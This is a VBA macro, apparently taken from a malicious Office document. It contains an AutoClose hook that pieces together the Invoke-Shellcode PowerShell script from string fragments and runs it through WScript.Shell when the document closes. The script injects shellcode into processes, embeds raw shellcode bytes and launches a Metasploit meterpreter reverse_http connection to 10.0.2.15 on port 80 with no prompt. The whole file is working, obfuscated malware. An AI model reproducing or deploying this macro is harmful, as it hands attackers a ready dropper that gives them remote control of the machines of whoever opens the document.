Sub AutoClose()
        zOp
End Sub

Public Function zOp() As Variant
        Dim m As String
        m = "function Invoke-Shellcode
{
[CmdletBinding( Defaul"
        m = m + "tParameterSetName = 'RunLocal', SupportsShouldProc"
        m = m + "ess = $True , ConfirmImpact = 'High')] Param (
   "
        m = m + " [ValidateNotNullOrEmpty()]
    [UInt16]
    $Proc"
        m = m + "essID,
    [Parameter( ParameterSetName = 'RunLoca"
        m = m + "l' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
"
        m = m + "    $Shellcode,
    [Parameter( ParameterSetName ="
        m = m + " 'Metasploit' )]
    [ValidateSet( 'windows/meterp"
        m = m + "reter/reverse_http',
                  'windows/me"
        m = m + "terpreter/reverse_https',
                  Ignore"
        m = m + "Case = $True )]
    [String]
    $Payload = 'windo"
        m = m + "ws/meterpreter/reverse_http',
    [Parameter( Para"
        m = m + "meterSetName = 'ListPayloads' )]
    [Switch]
    "
        m = m + "$ListMetasploitPayloads,
    [Parameter( Mandatory"
        m = m + " = $True,
                ParameterSetName = 'Meta"
        m = m + "sploit' )]
    [ValidateNotNullOrEmpty()]
    [Str"
        m = m + "ing]
    $Lhost = '127.0.0.1',
    [Parameter( Man"
        m = m + "datory = $True,
                ParameterSetName ="
        m = m + " 'Metasploit' )]
    [ValidateRange( 1,65535 )]
  "
        m = m + "  [Int]
    $Lport = 8443,
    [Parameter( Paramet"
        m = m + "erSetName = 'Metasploit' )]
    [ValidateNotNull()"
        m = m + "]
    [String]
    $UserAgent = (Get-ItemProperty "
        m = m + "-Path 'HKCU:\Software\Microsoft\Windows\CurrentVer"
        m = m + "sion\Internet Settings').'User Agent',
    [Parame"
        m = m + "ter( ParameterSetName = 'Metasploit' )]
    [Valid"
        m = m + "ateNotNull()]
    [Switch]
    $Legacy = $False,
 "
        m = m + "   [Parameter( ParameterSetName = 'Metasploit' )]
"
        m = m + "    [ValidateNotNull()]
    [Switch]
    $Proxy = "
        m = m + "$False,
    [Switch]
    $Force = $False
)
    Set"
        m = m + "-StrictMode -Version 2.0
    if ($PsCmdlet.Paramet"
        m = m + "erSetName -eq 'ListPayloads')
    {
        $Avail"
        m = m + "ablePayloads = (Get-Command Invoke-Shellcode).Para"
        m = m + "meters['Payload'].Attributes |
            Where-O"
        m = m + "bject {$_.TypeId -eq [System.Management.Automation"
        m = m + ".ValidateSetAttribute]}
        foreach ($Payload "
        m = m + "in $AvailablePayloads.ValidValues)
        {
     "
        m = m + "       New-Object PSObject -Property @{ Payloads ="
        m = m + " $Payload }
        }
        Return
    }
    if "
        m = m + "( $PSBoundParameters['ProcessID'] )
    {
        "
        m = m + "Get-Process -Id $ProcessID -ErrorAction Stop | Out"
        m = m + "-Null
    }
    function Local:Get-DelegateType
  "
        m = m + "  {
        Param
        (
            [OutputTyp"
        m = m + "e([Type])]
            [Parameter( Position = 0)]
"
        m = m + "            [Type[]]
            $Parameters = (Ne"
        m = m + "w-Object Type[](0)),
            [Parameter( Posit"
        m = m + "ion = 1 )]
            [Type]
            $ReturnT"
        m = m + "ype = [Void]
        )
        $Domain = [AppDomai"
        m = m + "n]::CurrentDomain
        $DynAssembly = New-Objec"
        m = m + "t System.Reflection.AssemblyName('ReflectedDelegat"
        m = m + "e')
        $AssemblyBuilder = $Domain.DefineDynam"
        m = m + "icAssembly($DynAssembly, [System.Reflection.Emit.A"
        m = m + "ssemblyBuilderAccess]::Run)
        $ModuleBuilder"
        m = m + " = $AssemblyBuilder.DefineDynamicModule('InMemoryM"
        m = m + "odule', $false)
        $TypeBuilder = $ModuleBuil"
        m = m + "der.DefineType('MyDelegateType', 'Class, Public, S"
        m = m + "ealed, AnsiClass, AutoClass', [System.MulticastDel"
        m = m + "egate])
        $ConstructorBuilder = $TypeBuilder"
        m = m + ".DefineConstructor('RTSpecialName, HideBySig, Publ"
        m = m + "ic', [System.Reflection.CallingConventions]::Stand"
        m = m + "ard, $Parameters)
        $ConstructorBuilder.SetI"
        m = m + "mplementationFlags('Runtime, Managed')
        $Me"
        m = m + "thodBuilder = $TypeBuilder.DefineMethod('Invoke', "
        m = m + "'Public, HideBySig, NewSlot, Virtual', $ReturnType"
        m = m + ", $Parameters)
        $MethodBuilder.SetImplement"
        m = m + "ationFlags('Runtime, Managed')
        Write-Outpu"
        m = m + "t $TypeBuilder.CreateType()
    }
    function Loc"
        m = m + "al:Get-ProcAddress
    {
        Param
        (
 "
        m = m + "           [OutputType([IntPtr])]
            [Par"
        m = m + "ameter( Position = 0, Mandatory = $True )]
       "
        m = m + "     [String]
            $Module,
            [Pa"
        m = m + "rameter( Position = 1, Mandatory = $True )]
      "
        m = m + "      [String]
            $Procedure
        )
  "
        m = m + "      $SystemAssembly = [AppDomain]::CurrentDomain"
        m = m + ".GetAssemblies() |
            Where-Object { $_.G"
        m = m + "lobalAssemblyCache -And $_.Location.Split('\\')[-1"
        m = m + "].Equals('System.dll') }
        $UnsafeNativeMeth"
        m = m + "ods = $SystemAssembly.GetType('Microsoft.Win32.Uns"
        m = m + "afeNativeMethods')
        $GetModuleHandle = $Uns"
        m = m + "afeNativeMethods.GetMethod('GetModuleHandle')
    "
        m = m + "    $GetProcAddress = $UnsafeNativeMethods.GetMeth"
        m = m + "od('GetProcAddress', [Type[]]@([System.Runtime.Int"
        m = m + "eropServices.HandleRef], [String]))
        $Kern3"
        m = m + "2Handle = $GetModuleHandle.Invoke($null, @($Module"
        m = m + "))
        $tmpPtr = New-Object IntPtr
        $Ha"
        m = m + "ndleRef = New-Object System.Runtime.InteropService"
        m = m + "s.HandleRef($tmpPtr, $Kern32Handle)
        Write-"
        m = m + "Output $GetProcAddress.Invoke($null, @([System.Run"
        m = m + "time.InteropServices.HandleRef]$HandleRef, $Proced"
        m = m + "ure))
    }
    function Local:Emit-CallThreadStub"
        m = m + " ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [I"
        m = m + "nt] $Architecture)
    {
        $IntSizePtr = $Ar"
        m = m + "chitecture / 8
        function Local:ConvertTo-Li"
        m = m + "ttleEndian ([IntPtr] $Address)
        {
         "
        m = m + "   $LittleEndianByteArray = New-Object Byte[](0)
 "
        m = m + "           $Address.ToString("X$($IntSizePtr*2)") "
        m = m + "-split '([A-F0-9]{2})' | ForEach-Object { if ($_) "
        m = m + "{ $LittleEndianByteArray += [Byte] ('0x{0}' -f $_)"
        m = m + " } }
            [System.Array]::Reverse($LittleEn"
        m = m + "dianByteArray)
            Write-Output $LittleEnd"
        m = m + "ianByteArray
        }
        $CallStub = New-Obj"
        m = m + "ect Byte[](0)
        if ($IntSizePtr -eq 8)
     "
        m = m + "   {
            [Byte[]] $CallStub = 0x48,0xB8   "
        m = m + "                   # MOV   QWORD RAX, &shellcode
 "
        m = m + "           $CallStub += ConvertTo-LittleEndian $Ba"
        m = m + "seAddr       # &shellcode
            $CallStub +="
        m = m + " 0xFF,0xD0                              # CALL  RA"
        m = m + "X
            $CallStub += 0x6A,0x00              "
        m = m + "                # PUSH  BYTE 0
            $CallSt"
        m = m + "ub += 0x48,0xB8                              # MOV"
        m = m + "   QWORD RAX, &ExitThread
            $CallStub +="
        m = m + " ConvertTo-LittleEndian $ExitThreadAddr # &ExitThr"
        m = m + "ead
            $CallStub += 0xFF,0xD0            "
        m = m + "                  # CALL  RAX
        }
        el"
        m = m + "se
        {
            [Byte[]] $CallStub = 0xB8"
        m = m + "                           # MOV   DWORD EAX, &she"
        m = m + "llcode
            $CallStub += ConvertTo-LittleEn"
        m = m + "dian $BaseAddr       # &shellcode
            $Cal"
        m = m + "lStub += 0xFF,0xD0                              # "
        m = m + "CALL  EAX
            $CallStub += 0x6A,0x00      "
        m = m + "                        # PUSH  BYTE 0
           "
        m = m + " $CallStub += 0xB8                                "
        m = m + "   # MOV   DWORD EAX, &ExitThread
            $Cal"
        m = m + "lStub += ConvertTo-LittleEndian $ExitThreadAddr # "
        m = m + "&ExitThread
            $CallStub += 0xFF,0xD0    "
        m = m + "                          # CALL  EAX
        }
  "
        m = m + "      Write-Output $CallStub
    }
    function Lo"
        m = m + "cal:Inject-RemoteShellcode ([Int] $ProcessID)
    "
        m = m + "{
        $hProcess = $OpenProcess.Invoke(0x001F0F"
        m = m + "FF, $false, $ProcessID) # ProcessAccessFlags.All ("
        m = m + "0x001F0FFF)
        if (!$hProcess)
        {
    "
        m = m + "        Throw "Unable to open a process handle for"
        m = m + " PID: $ProcessID"
        }
        $IsWow64 = $fa"
        m = m + "lse
        if ($64bitCPU) # Only perform theses c"
        m = m + "hecks if CPU is 64-bit
        {
            $IsWo"
        m = m + "w64Process.Invoke($hProcess, [Ref] $IsWow64) | Out"
        m = m + "-Null
            if ((!$IsWow64) -and $PowerShell"
        m = m + "32bit)
            {
                Throw 'Unable"
        m = m + " to inject 64-bit shellcode from within 32-bit Pow"
        m = m + "ershell. Use the 64-bit version of Powershell if y"
        m = m + "ou want this to work.'
            }
            e"
        m = m + "lseif ($IsWow64) # 32-bit Wow64 process
          "
        m = m + "  {
                if ($Shellcode32.Length -eq 0)"
        m = m + "
                {
                    Throw 'No s"
        m = m + "hellcode was placed in the $Shellcode32 variable!'"
        m = m + "
                }
                $Shellcode = $S"
        m = m + "hellcode32
            }
            else # 64-bit"
        m = m + " process
            {
                if ($Shellc"
        m = m + "ode64.Length -eq 0)
                {
            "
        m = m + "        Throw 'No shellcode was placed in the $She"
        m = m + "llcode64 variable!'
                }
            "
        m = m + "    $Shellcode = $Shellcode64
            }
      "
        m = m + "  }
        else # 32-bit CPU
        {
          "
        m = m + "  if ($Shellcode32.Length -eq 0)
            {
   "
        m = m + "             Throw 'No shellcode was placed in the"
        m = m + " $Shellcode32 variable!'
            }
           "
        m = m + " $Shellcode = $Shellcode32
        }
        $Remo"
        m = m + "teMemAddr = $VirtualAllocEx.Invoke($hProcess, [Int"
        m = m + "Ptr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) #"
        m = m + " (Reserve|Commit, RWX)
        if (!$RemoteMemAddr"
        m = m + ")
        {
            Throw "Unable to allocate "
        m = m + "shellcode memory in PID: $ProcessID"
        }
   "
        m = m + "     $WriteProcessMemory.Invoke($hProcess, $Remote"
        m = m + "MemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) |"
        m = m + " Out-Null
        $ExitThreadAddr = Get-ProcAddres"
        m = m + "s kernel32.dll ExitThread
        if ($IsWow64)
  "
        m = m + "      {
            $CallStub = Emit-CallThreadStu"
        m = m + "b $RemoteMemAddr $ExitThreadAddr 32
        }
    "
        m = m + "    else
        {
            $CallStub = Emit-Ca"
        m = m + "llThreadStub $RemoteMemAddr $ExitThreadAddr 64
   "
        m = m + "     }
        $RemoteStubAddr = $VirtualAllocEx.I"
        m = m + "nvoke($hProcess, [IntPtr]::Zero, $CallStub.Length,"
        m = m + " 0x3000, 0x40) # (Reserve|Commit, RWX)
        if "
        m = m + "(!$RemoteStubAddr)
        {
            Throw "Un"
        m = m + "able to allocate thread call stub memory in PID: $"
        m = m + "ProcessID"
        }
        $WriteProcessMemory.I"
        m = m + "nvoke($hProcess, $RemoteStubAddr, $CallStub, $Call"
        m = m + "Stub.Length, [Ref] 0) | Out-Null
        $ThreadHa"
        m = m + "ndle = $CreateRemoteThread.Invoke($hProcess, [IntP"
        m = m + "tr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, "
        m = m + "[IntPtr]::Zero)
        if (!$ThreadHandle)
      "
        m = m + "  {
            Throw "Unable to launch remote thr"
        m = m + "ead in PID: $ProcessID"
        }
        $CloseHa"
        m = m + "ndle.Invoke($hProcess) | Out-Null
    }
    functi"
        m = m + "on Local:Inject-LocalShellcode
    {
        if ($"
        m = m + "PowerShell32bit) {
            if ($Shellcode32.Le"
        m = m + "ngth -eq 0)
            {
                Throw 'N"
        m = m + "o shellcode was placed in the $Shellcode32 variabl"
        m = m + "e!'
                return
            }
         "
        m = m + "   $Shellcode = $Shellcode32
        }
        els"
        m = m + "e
        {
            if ($Shellcode64.Length -e"
        m = m + "q 0)
            {
                Throw 'No shell"
        m = m + "code was placed in the $Shellcode64 variable!'
   "
        m = m + "             return
            }
            $She"
        m = m + "llcode = $Shellcode64
        }
        $BaseAddre"
        m = m + "ss = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellco"
        m = m + "de.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        m = m + "X)
        if (!$BaseAddress)
        {
          "
        m = m + "  Throw "Unable to allocate shellcode memory in PI"
        m = m + "D: $ProcessID"
        }
        [System.Runtime.I"
        m = m + "nteropServices.Marshal]::Copy($Shellcode, 0, $Base"
        m = m + "Address, $Shellcode.Length)
        $ExitThreadAdd"
        m = m + "r = Get-ProcAddress kernel32.dll ExitThread
      "
        m = m + "  if ($PowerShell32bit)
        {
            $Cal"
        m = m + "lStub = Emit-CallThreadStub $BaseAddress $ExitThre"
        m = m + "adAddr 32
        }
        else
        {
       "
        m = m + "     $CallStub = Emit-CallThreadStub $BaseAddress "
        m = m + "$ExitThreadAddr 64
        }
        $CallStubAddr"
        m = m + "ess = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallSt"
        m = m + "ub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        m = m + "X)
        if (!$CallStubAddress)
        {
      "
        m = m + "      Throw "Unable to allocate thread call stub.""
        m = m + "
        }
        [System.Runtime.InteropServices"
        m = m + ".Marshal]::Copy($CallStub, 0, $CallStubAddress, $C"
        m = m + "allStub.Length)
        $ThreadHandle = $CreateThr"
        m = m + "ead.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $B"
        m = m + "aseAddress, 0, [IntPtr]::Zero)
        if (!$Threa"
        m = m + "dHandle)
        {
            Throw "Unable to la"
        m = m + "unch thread."
        }
        $WaitForSingleObje"
        m = m + "ct.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
  "
        m = m + "      $VirtualFree.Invoke($CallStubAddress, $CallS"
        m = m + "tub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE ("
        m = m + "0x8000)
        $VirtualFree.Invoke($BaseAddress, "
        m = m + "$Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RE"
        m = m + "LEASE (0x8000)
    }
    $IsWow64ProcessAddr = Get"
        m = m + "-ProcAddress kernel32.dll IsWow64Process
    if ($"
        m = m + "IsWow64ProcessAddr)
    {
        $IsWow64ProcessD"
        m = m + "elegate = Get-DelegateType @([IntPtr], [Bool].Make"
        m = m + "ByRefType()) ([Bool])
        $IsWow64Process = [S"
        m = m + "ystem.Runtime.InteropServices.Marshal]::GetDelegat"
        m = m + "eForFunctionPointer($IsWow64ProcessAddr, $IsWow64P"
        m = m + "rocessDelegate)
        $64bitCPU = $true
    }
  "
        m = m + "  else
    {
        $64bitCPU = $false
    }
    "
        m = m + "if ([IntPtr]::Size -eq 4)
    {
        $PowerShel"
        m = m + "l32bit = $true
    }
    else
    {
        $Power"
        m = m + "Shell32bit = $false
    }
    if ($PsCmdlet.Parame"
        m = m + "terSetName -eq 'Metasploit')
    {
        if (!$P"
        m = m + "owerShell32bit) {
            $RootInvocation = $M"
        m = m + "yInvocation.Line
            $Response = $True
   "
        m = m + "         if ( $Force -or ( $Response = $psCmdlet.S"
        m = m + "houldContinue( "Do you want to launch the payload "
        m = m + "from x86 Powershell?",
                   "Attempt"
        m = m + " to execute 32-bit shellcode from 64-bit Powershel"
        m = m + "l. Note: This process takes about one minute. Be p"
        m = m + "atient! You will also see some artifacts of the sc"
        m = m + "ript loading in the other process." ) ) ) { }
    "
        m = m + "        if ( !$Response )
            {
          "
        m = m + "      Return
            }
            if ($MyInvo"
        m = m + "cation.BoundParameters['Force'])
            {
   "
        m = m + "             $Command = "function $($MyInvocation."
        m = m + "InvocationName) {`n" + $MyInvocation.MyCommand.Scr"
        m = m + "iptBlock + "`n}`n$($RootInvocation)`n`n"
         "
        m = m + "   }
            else
            {
              "
        m = m + "  $Command = "function $($MyInvocation.InvocationN"
        m = m + "ame) {`n" + $MyInvocation.MyCommand.ScriptBlock + "
        m = m + ""`n}`n$($RootInvocation) -Force`n`n"
            }"
        m = m + "
            $CommandBytes = [System.Text.Encoding"
        m = m + "]::Ascii.GetBytes($Command)
            $EncodedCo"
        m = m + "mmand = [Convert]::ToBase64String($CommandBytes)
 "
        m = m + "           $Execute = '$Command' + " | $Env:windir"
        m = m + "\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -N"
        m = m + "oProfile -Command -"
            Invoke-Expression"
        m = m + " -Command $Execute | Out-Null
            Return
 "
        m = m + "       }
        $Response = $True
        if ( $F"
        m = m + "orce -or ( $Response = $psCmdlet.ShouldContinue( ""
        m = m + "Do you know what you're doing?",
               "A"
        m = m + "bout to download Metasploit payload '$($Payload)' "
        m = m + "LHOST=$($Lhost), LPORT=$($Lport)" ) ) ) { }
      "
        m = m + "  if ( !$Response )
        {
            Return
 "
        m = m + "       }
        switch ($Payload)
        {
     "
        m = m + "       'windows/meterpreter/reverse_http'
        "
        m = m + "    {
                $SSL = ''
            }
    "
        m = m + "        'windows/meterpreter/reverse_https'
      "
        m = m + "      {
                $SSL = 's'
               "
        m = m + " [System.Net.ServicePointManager]::ServerCertifica"
        m = m + "teValidationCallback = {$True}
            }
     "
        m = m + "   }
        if ($Legacy)
        {
            $R"
        m = m + "equest = "http$($SSL)://$($Lhost):$($Lport)/INITM""
        m = m + "
        } else {
            $CharArray = 48..57 "
        m = m + "+ 65..90 + 97..122 | ForEach-Object {[Char]$_}
   "
        m = m + "         $SumTest = $False
            while ($Sum"
        m = m + "Test -eq $False)
            {
                $Ge"
        m = m + "neratedUri = $CharArray | Get-Random -Count 4
    "
        m = m + "            $SumTest = (([int[]] $GeneratedUri | M"
        m = m + "easure-Object -Sum).Sum % 0x100 -eq 92)
          "
        m = m + "  }
            $RequestUri = -join $GeneratedUri
"
        m = m + "            $Request = "http$($SSL)://$($Lhost):$("
        m = m + "$Lport)/$($RequestUri)"
        }
        $Uri = N"
        m = m + "ew-Object Uri($Request)
        $WebClient = New-O"
        m = m + "bject System.Net.WebClient
        $WebClient.Head"
        m = m + "ers.Add('user-agent', "$UserAgent")
        if ($P"
        m = m + "roxy)
        {
            $WebProxyObject = New-"
        m = m + "Object System.Net.WebProxy
            $ProxyAddre"
        m = m + "ss = (Get-ItemProperty -Path 'HKCU:\Software\Micro"
        m = m + "soft\Windows\CurrentVersion\Internet Settings').Pr"
        m = m + "oxyServer
            if ($ProxyAddress)
         "
        m = m + "   {
                $WebProxyObject.Address = $Pr"
        m = m + "oxyAddress
                $WebProxyObject.UseDefa"
        m = m + "ultCredentials = $True
                $WebClientO"
        m = m + "bject.Proxy = $WebProxyObject
            }
      "
        m = m + "  }
        try
        {
            [Byte[]] $Sh"
        m = m + "ellcode32 = $WebClient.DownloadData($Uri)
        "
        m = m + "}
        catch
        {
            Throw "$($Er"
        m = m + "ror[0])"
        }
        [Byte[]] $Shellcode64 ="
        m = m + " $Shellcode32
    }
    elseif ($PSBoundParameters"
        m = m + "['Shellcode'])
    {
        [Byte[]] $Shellcode32"
        m = m + " = $Shellcode
        [Byte[]] $Shellcode64 = $She"
        m = m + "llcode32
    }
    else
    {
        [Byte[]] $Sh"
        m = m + "ellcode32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0"
        m = m + "x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
     "
        m = m + "                             0x52,0x0c,0x8b,0x52,0"
        m = m + "x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0"
        m = m + "x31,0xc0,
                                  0xac,0"
        m = m + "x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0"
        m = m + "xc7,0xe2,0xf0,0x52,0x57,
                         "
        m = m + "         0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0"
        m = m + "x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,
          "
        m = m + "                        0xd0,0x50,0x8b,0x48,0x18,0"
        m = m + "x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0"
        m = m + "x8b,
                                  0x01,0xd6,0"
        m = m + "x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0"
        m = m + "x38,0xe0,0x75,0xf4,
                              "
        m = m + "    0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0"
        m = m + "x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
               "
        m = m + "                   0x0c,0x4b,0x8b,0x58,0x1c,0x01,0"
        m = m + "xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,
"
        m = m + "                                  0x5b,0x5b,0x61,0"
        m = m + "x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0"
        m = m + "xeb,0x86,0x5d,
                                  0"
        m = m + "x6a,0x01,0x8d,0x85,0xb9,0x00,0x00,0x00,0x50,0x68,0"
        m = m + "x31,0x8b,0x6f,0x87,0xff,0xd5,
                    "
        m = m + "              0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0"
        m = m + "x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,
     "
        m = m + "                             0x80,0xfb,0xe0,0x75,0"
        m = m + "x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0"
        m = m + "xd5,0x63,
                                  0x61,0"
        m = m + "x6c,0x63,0x00)
        [Byte[]] $Shellcode64 = @(0"
        m = m + "xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0"
        m = m + "x41,0x51,0x41,0x50,0x52,0x51,
                    "
        m = m + "              0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0"
        m = m + "x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
     "
        m = m + "                             0x20,0x48,0x8b,0x72,0"
        m = m + "x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0"
        m = m + "x31,0xc0,
                                  0xac,0"
        m = m + "x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0"
        m = m + "x41,0x01,0xc1,0xe2,0xed,
                         "
        m = m + "         0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0"
        m = m + "x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
          "
        m = m + "                        0x00,0x00,0x00,0x48,0x85,0"
        m = m + "xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0"
        m = m + "x44,
                                  0x8b,0x40,0"
        m = m + "x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0"
        m = m + "x8b,0x34,0x88,0x48,
                              "
        m = m + "    0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0"
        m = m + "x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
               "
        m = m + "                   0x38,0xe0,0x75,0xf1,0x4c,0x03,0"
        m = m + "x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
"
        m = m + "                                  0x8b,0x40,0x24,0"
        m = m + "x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0"
        m = m + "x40,0x1c,0x49,
                                  0"
        m = m + "x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0"
        m = m + "x58,0x41,0x58,0x5e,0x59,0x5a,
                    "
        m = m + "              0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0"
        m = m + "x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
     "
        m = m + "                             0x59,0x5a,0x48,0x8b,0"
        m = m + "x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0"
        m = m + "x00,0x00,
                                  0x00,0"
        m = m + "x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0"
        m = m + "x00,0x41,0xba,0x31,0x8b,
                         "
        m = m + "         0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0"
        m = m + "x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
          "
        m = m + "                        0xd5,0x48,0x83,0xc4,0x28,0"
        m = m + "x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0"
        m = m + "x47,
                                  0x13,0x72,0"
        m = m + "x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0"
        m = m + "x61,0x6c,0x63,0x00)
    }
    if ( $PSBoundParamet"
        m = m + "ers['ProcessID'] )
    {
        $OpenProcessAddr "
        m = m + "= Get-ProcAddress kernel32.dll OpenProcess
       "
        m = m + " $OpenProcessDelegate = Get-DelegateType @([UInt32"
        m = m + "], [Bool], [UInt32]) ([IntPtr])
        $OpenProce"
        m = m + "ss = [System.Runtime.InteropServices.Marshal]::Get"
        m = m + "DelegateForFunctionPointer($OpenProcessAddr, $Open"
        m = m + "ProcessDelegate)
        $VirtualAllocExAddr = Get"
        m = m + "-ProcAddress kernel32.dll VirtualAllocEx
        $"
        m = m + "VirtualAllocExDelegate = Get-DelegateType @([IntPt"
        m = m + "r], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntP"
        m = m + "tr])
        $VirtualAllocEx = [System.Runtime.Int"
        m = m + "eropServices.Marshal]::GetDelegateForFunctionPoint"
        m = m + "er($VirtualAllocExAddr, $VirtualAllocExDelegate)
 "
        m = m + "       $WriteProcessMemoryAddr = Get-ProcAddress k"
        m = m + "ernel32.dll WriteProcessMemory
        $WriteProce"
        m = m + "ssMemoryDelegate = Get-DelegateType @([IntPtr], [I"
        m = m + "ntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType"
        m = m + "()) ([Bool])
        $WriteProcessMemory = [System"
        m = m + ".Runtime.InteropServices.Marshal]::GetDelegateForF"
        m = m + "unctionPointer($WriteProcessMemoryAddr, $WriteProc"
        m = m + "essMemoryDelegate)
        $CreateRemoteThreadAddr"
        m = m + " = Get-ProcAddress kernel32.dll CreateRemoteThread"
        m = m + "
        $CreateRemoteThreadDelegate = Get-Delegat"
        m = m + "eType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [I"
        m = m + "ntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $Cr"
        m = m + "eateRemoteThread = [System.Runtime.InteropServices"
        m = m + ".Marshal]::GetDelegateForFunctionPointer($CreateRe"
        m = m + "moteThreadAddr, $CreateRemoteThreadDelegate)
     "
        m = m + "   $CloseHandleAddr = Get-ProcAddress kernel32.dll"
        m = m + " CloseHandle
        $CloseHandleDelegate = Get-De"
        m = m + "legateType @([IntPtr]) ([Bool])
        $CloseHand"
        m = m + "le = [System.Runtime.InteropServices.Marshal]::Get"
        m = m + "DelegateForFunctionPointer($CloseHandleAddr, $Clos"
        m = m + "eHandleDelegate)
        if ( $Force -or $psCmdlet"
        m = m + ".ShouldContinue( 'Do you wish to carry out your ev"
        m = m + "il plans?',
                 "Injecting shellcode "
        m = m + "injecting into $((Get-Process -Id $ProcessId).Proc"
        m = m + "essName) ($ProcessId)!" ) )
        {
            "
        m = m + "Inject-RemoteShellcode $ProcessId
        }
    }
"
        m = m + "    else
    {
        $VirtualAllocAddr = Get-Pro"
        m = m + "cAddress kernel32.dll VirtualAlloc
        $Virtua"
        m = m + "lAllocDelegate = Get-DelegateType @([IntPtr], [UIn"
        m = m + "t32], [UInt32], [UInt32]) ([IntPtr])
        $Virt"
        m = m + "ualAlloc = [System.Runtime.InteropServices.Marshal"
        m = m + "]::GetDelegateForFunctionPointer($VirtualAllocAddr"
        m = m + ", $VirtualAllocDelegate)
        $VirtualFreeAddr "
        m = m + "= Get-ProcAddress kernel32.dll VirtualFree
       "
        m = m + " $VirtualFreeDelegate = Get-DelegateType @([IntPtr"
        m = m + "], [Uint32], [UInt32]) ([Bool])
        $VirtualFr"
        m = m + "ee = [System.Runtime.InteropServices.Marshal]::Get"
        m = m + "DelegateForFunctionPointer($VirtualFreeAddr, $Virt"
        m = m + "ualFreeDelegate)
        $CreateThreadAddr = Get-P"
        m = m + "rocAddress kernel32.dll CreateThread
        $Crea"
        m = m + "teThreadDelegate = Get-DelegateType @([IntPtr], [U"
        m = m + "Int32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) (["
        m = m + "IntPtr])
        $CreateThread = [System.Runtime.I"
        m = m + "nteropServices.Marshal]::GetDelegateForFunctionPoi"
        m = m + "nter($CreateThreadAddr, $CreateThreadDelegate)
   "
        m = m + "     $WaitForSingleObjectAddr = Get-ProcAddress ke"
        m = m + "rnel32.dll WaitForSingleObject
        $WaitForSin"
        m = m + "gleObjectDelegate = Get-DelegateType @([IntPtr], ["
        m = m + "Int32]) ([Int])
        $WaitForSingleObject = [Sy"
        m = m + "stem.Runtime.InteropServices.Marshal]::GetDelegate"
        m = m + "ForFunctionPointer($WaitForSingleObjectAddr, $Wait"
        m = m + "ForSingleObjectDelegate)
        if ( $Force -or $"
        m = m + "psCmdlet.ShouldContinue( 'Do you wish to carry out"
        m = m + " your evil plans?',
                 "Injecting sh"
        m = m + "ellcode into the running PowerShell process!" ) )
"
        m = m + "        {
            Inject-LocalShellcode
      "
        m = m + "  }
    }
}
Invoke-Shellcode -Payload windows/mete"
        m = m + "rpreter/reverse_http -Lhost 10.0.2.15 -Lport 80 -F"
        m = m + "orce"
        Set asd = CreateObject("WScript.Shell")
        asd.Run(m)
End Function
